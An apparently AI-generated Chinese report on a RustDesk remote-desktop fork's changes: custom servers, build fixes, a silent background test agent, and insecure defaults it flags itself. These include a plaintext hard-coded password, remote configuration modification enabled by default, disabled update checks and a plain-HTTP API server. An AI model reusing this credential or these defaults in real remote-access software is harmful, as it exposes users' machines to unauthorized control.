# RustDesk 修改项文档（`rustdesk` 分支 vs 上游原版）

> 生成时间：2026-10-23
> 对比基准：上游原版提交 `5abae617d`（*Italian language update (#14949)*）
> 本文所在分支：`rustdesk`（HEAD = `1a83f83d6`）

---

## 一、总览

`rustdesk` 分支在上游原版基础上共 7 个提交（含子模块内 2 个提交），改动可归为 5 大类：

| 类别 | 涉及文件 | 说明 |
|---|---|---|
| 1. 品牌与服务器定制 | `src/common.rs`、`libs/hbb_common/src/config.rs` | 替换 API / 中继 / rendezvous 服务器，注入默认密码 |
| 2. UI 定制 | `flutter/lib/desktop/pages/connection_page.dart` | 移除客户端广告入口 |
| 3. 依赖与子模块重定向 | `.gitmodules`、`Cargo.toml`、`Cargo.lock`、`flutter/pubspec.lock` | 指向个人 fork，新增子 crate |
| 4. Windows 构建链修复 | `libs/scrap/build.rs`、`libs/scrap/src/bindings/*.h`、`build.py` | 修复 MSVC 下 bindgen 失败 |
| 5. 新增构建脚本与工具 | `scripts/*.ps1`、`tools/agent-bg/` | 构建环境脚本、后台测试程序 |

---

## 二、逐项详解

### 1. API 服务器地址替换

**文件**：`src/common.rs` → `get_api_server_()` 兜底返回值

| 版本 | 值 |
|---|---|
| 上游原版 | `https://admin.rustdesk.com` |
| **当前 `rustdesk` 分支** | `http://47.103.198.242:21114` |

改动历史（4 次反复）：

```
上游      → https://admin.rustdesk.com
5566074   → http://47.103.198.242:21114      "修改替换 API 地址"
b7b91b0   → https://rust.igame.plus          "apply custom modifications"
167fe19   → https://admin.rustdesk.com       "最终修复：本地修正API地址为官方"
1a83f83   → http://47.103.198.242:21114      当前状态
```

> ⚠️ **注意**：提交信息 `167fe19db` 声称"修正API地址为官方"，但最新提交 `1a83f83d6` 又把它改回了私有服务器。当前实际生效的是 `http://47.103.198.242:21114`。

---

### 2. 中继 / Rendezvous 服务器与硬编码密码

**文件**：`libs/hbb_common/src/config.rs`（子模块内 2 个提交）

```rust
// 上游原版
pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";

// rustdesk 分支
pub const RENDEZVOUS_SERVERS: &[&str] = &["rust.igame.plus"];
pub const RS_PUB_KEY: &str = "iyOtzD+NaCsASaxmPOAmuyvLJt56FNXifWXQk0NVgZw=";
```

同时在 `HARD_SETTINGS` 中注入了**硬编码默认密码**：

```rust
pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = {
    let mut map = HashMap::new();
    map.insert("password".to_string(), "Zxc900807..".to_string());
    RwLock::new(map)
};
```

> 🔴 **安全提示**：`HARD_SETTINGS` 中的 `password` 是**不可被用户配置覆盖**的强制密码，`"Zxc900807.."` 会明文存在于二进制中。任何拿到你程序的人都能看到该密码。同时 `RS_PUB_KEY` 也被替换为你自建服务器的公钥（这是正确的做法）。
>
> 建议：若需要密码功能，改为读取环境变量或加密存储；至少在公开发布前更换此密码。

---

### 3. 默认配置项注入（首次运行自动写入）

**文件**：`libs/hbb_common/src/config.rs`

`Config2::load()` 中新增：

```rust
if !config.options.contains_key("allow-remote-config-modification") {
    config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
    store = true;
}
```

`LocalConfig::load()` 中新增 4 项：

| 配置项 | 默认值 | 效果 |
|---|---|---|
| `allow-remote-config-modification` | `Y` | 允许远端修改配置 |
| `enable-udp-punch` | `Y` | 启用 UDP 打洞 |
| `enable-ipv6-punch` | `Y` | 启用 IPv6 打洞 |
| `enable-check-update` | `N` | **关闭**自动更新检查 |

> ⚠️ `allow-remote-config-modification = Y` 允许远端会话修改本机配置，结合上一节的硬编码密码会放大风险。

---

### 4. 移除客户端广告 / 公共服务器引导入口

**文件**：`flutter/lib/desktop/pages/connection_page.dart` → `_OnlineStatusWidgetState`

原版在服务就绪且使用公共服务器时显示"设置自建服务器"引导链接（`setup_server_tip`），修改后该 `Row` 的 `children` 被清空：

```dart
Widget setupServerWidget() => Flexible(
  child: Offstage(
    offstage: !(...),
    child: Row(
      crossAxisAlignment: CrossAxisAlignment.center,
      children: [],          // ← 原本含 Text('setup_server_tip') + InkWell
    ),
  ),
);
```

净变化：`+10 / -30` 行。

---

### 5. 子模块重定向至个人 Fork

**文件**：`.gitmodules`

```diff
 [submodule "libs/hbb_common"]
 	path = libs/hbb_common
-	url = https://github.com/rustdesk/hbb_common
+	url = https://github.com/mouren1988/hbb_common
```

**影响**：任何人 clone 你的仓库时会自动拉取你的 `hbb_common` fork。同步上游时需注意子模块冲突。

---

### 6. 新增 `tools/agent-bg` 子 crate

**文件**：`Cargo.toml`（workspace members）、`Cargo.lock`、`tools/agent-bg/Cargo.toml`、`tools/agent-bg/src/main.rs`

一个独立的 Windows GUI 子系统测试程序，用于验证后台静默运行行为：

- `#![cfg_attr(all(not(debug_assertions), target_os = "windows"), windows_subsystem = "windows")]` —— Release 下不挂载控制台
- `AttachConsole(ATTACH_PARENT_PROCESS)` + `FreeConsole()` 脱离父控制台
- Tokio 多线程运行时，30 秒心跳日志写入 `%PROGRAMDATA%\RustDeskAgentTest\logs\agent-bg.log`
- 监听 `Ctrl+C` 优雅退出

> 与 RustDesk 主程序**完全分离**，不参与主客户端构建目标。

---

### 7. Windows 构建链修复（`libs/scrap`）

#### 7a. `libs/scrap/build.rs` —— MSVC bindgen 支持

新增三个函数（仅 Windows 生效）：

```rust
#[cfg(windows)]
fn apply_windows_bindgen_clang_args(mut b: bindgen::Builder) -> bindgen::Builder {
    b = b.clang_arg("--target=x86_64-pc-windows-msvc")
        .clang_arg("-fms-compatibility")
        .clang_arg("-fms-extensions");
    // 从 INCLUDE 环境变量收集头文件目录
    // 从 VCINSTALLDIR 定位 MSVC Tools/MSVC/<ver>/include
    // 从 WindowsSdkDir + WindowsSDKVersion 定位 ucrt/shared/um
    ...
}
```

同时 bindgen 失败时给出带文件名的明确报错：

```diff
-    b.generate().unwrap().write_to_file(ffi_rs).unwrap();
+    b.generate()
+        .unwrap_or_else(|e| panic!("bindgen failed for {}: {e}", ffi_header.display()))
+        .write_to_file(ffi_rs)
+        .unwrap();
```

#### 7b. `libs/scrap/src/bindings/vpx_ffi.h` —— include 顺序修复

```diff
+/* encoder/decoder 须在 vp8.h 之前，否则 bindgen 可能把 vpx_codec_*_cfg 生成为 opaque { _address } */
+#include <vpx/vpx_encoder.h>
+#include <vpx/vpx_decoder.h>
 #include <vpx/vp8.h>
 #include <vpx/vp8cx.h>
 #include <vpx/vp8dx.h>
-#include <vpx/vpx_codec.h>
```

**原因**：头文件顺序会影响 bindgen 生成的类型是否为 opaque。

#### 7c. `libs/scrap/src/bindings/aom_ffi.h` —— 同类 include 重排

将 `aom_encoder.h` / `aom_decoder.h` 提前，并清理行尾空格、补充文件末尾换行。

---

### 8. `build.py` —— `python3` 改为 `python`

**文件**：`build.py` → `build_flutter_windows()`

```diff
-        f'python3 ./generate.py -f ../../{flutter_build_dir_2} -o . -e ../../{flutter_build_dir_2}/rustdesk.exe')
+        f'python ./generate.py -f ../../{flutter_build_dir_2} -o . -e ../../{flutter_build_dir_2}/rustdesk.exe')
```

**原因**：Windows 上 `python3` 命令通常不存在，这是 Windows 构建的实际阻塞点。

---

### 9. 新增 PowerShell 构建脚本

#### `scripts/Enter-RustdeskBuildEnv.ps1`（129 行）

一键配置 Windows 构建环境，需 dot-source 引入：

```powershell
. D:\iGame+\rustdesk\scripts\Enter-RustdeskBuildEnv.ps1
```

主要功能：

- 用 `vswhere` 定位 Visual Studio / Build Tools 的 `vcvars64.bat`，通过 `set` 转储方式导入 MSVC 环境变量（避免 `vcvars` 覆盖整个会话导致 `LIBCLANG_PATH` 丢失）
- 自动探测 `libclang.dll`（bindgen 必需），依次尝试 `LLVM_HOME`、`LIBCLANG_PATH`、常见安装路径、`D:\iGame+\LLVM-22.1.4-win64`
- 设置 `LIBCLANG_PATH` / `LLVM_HOME` / `VCPKG_ROOT` / `VCPKG_INSTALLED_ROOT`，并把 Flutter、Cargo 加入 `PATH`
- 支持 `-FlutterRoot` / `-VcpkgRoot` / `-LlvmRoot` 参数覆盖

#### `scripts/build-windows.ps1`（55 行）

构建完整 Flutter 客户端：

```powershell
.\scripts\build-windows.ps1
```

- 自动 source 上面的环境脚本
- 定位 Python 3.12/3.13
- 执行 `python build.py --portable --flutter --skip-portable-pack`
- 输出并校验 `flutter\build\windows\x64\runner\Release\rustdesk.exe`

#### `scripts/build-agent-bg.ps1`（24 行）

构建 `tools/agent-bg` 测试二进制。

---

### 10. 其他

**`libs/portable/app_metadata.toml`** —— 新增文件，内容为：

```toml
timestamp = 1777992741043
```

便携版打包元数据。

**`flutter/pubspec.lock`** —— 依赖版本更新（`flutter_svg`、`http` 等若干包升级），并因重新生成而出现条目顺序变化。

**`Cargo.lock`** —— 新增 `agent-bg` 包及 `windows` 系列 crate（`windows` 0.58.0、`windows-core`、`windows-implement`、`windows-interface`、`windows-result`、`windows-strings`）等。

---

## 三、安全风险汇总

| 级别 | 项 | 位置 |
|---|---|---|
| 🔴 高 | 硬编码默认密码 `Zxc900807..` 明文写入二进制 | `libs/hbb_common/src/config.rs` |
| 🔴 高 | 默认允许远端修改配置 `allow-remote-config-modification = Y` | `libs/hbb_common/src/config.rs` |
| 🟠 中 | API 服务器为明文 HTTP（非 HTTPS） | `src/common.rs` |
| 🟠 中 | 提交信息与实际代码不符（"修正为官方" 实为私有服务器） | `src/common.rs` |
| 🟡 低 | 自建 rendezvous/relay 服务器与硬编码公钥 | `libs/hbb_common/src/config.rs` |

---

## 四、分支与同步策略

```
rustdesk (1a83f83d6)  ← 你的修改版，含全部定制
    │
    └─ 167fe19db
        └─ b7b91b0d5
            └─ 3646bc925  556607439  8f20c22f9  2cd015fc6
                └─ 5abae617d  ← 上游原版分叉点
                    └─ master (167fe19db) ← 跟踪 origin/master
```

同步上游：

```powershell
git checkout master
git pull
git checkout rustdesk
git merge master        # 有冲突时优先保留 src/common.rs 与 hbb_common/config.rs
git submodule update --init --recursive
```

---

## 五、改动文件清单

```
父仓库（12 个文件）
  M  Cargo.lock
  M  Cargo.toml
  M  build.py
  M  src/common.rs
  M  flutter/lib/desktop/pages/connection_page.dart
  M  flutter/pubspec.lock
  M  libs/scrap/build.rs
  M  libs/scrap/src/bindings/aom_ffi.h
  M  libs/scrap/src/bindings/vpx_ffi.h
  M  .gitmodules
  A  libs/portable/app_metadata.toml
  A  scripts/Enter-RustdeskBuildEnv.ps1
  A  scripts/build-agent-bg.ps1
  A  scripts/build-windows.ps1
  A  tools/agent-bg/Cargo.toml
  A  tools/agent-bg/src/main.rs

子模块 libs/hbb_common（2 个提交）
  M  src/config.rs
```
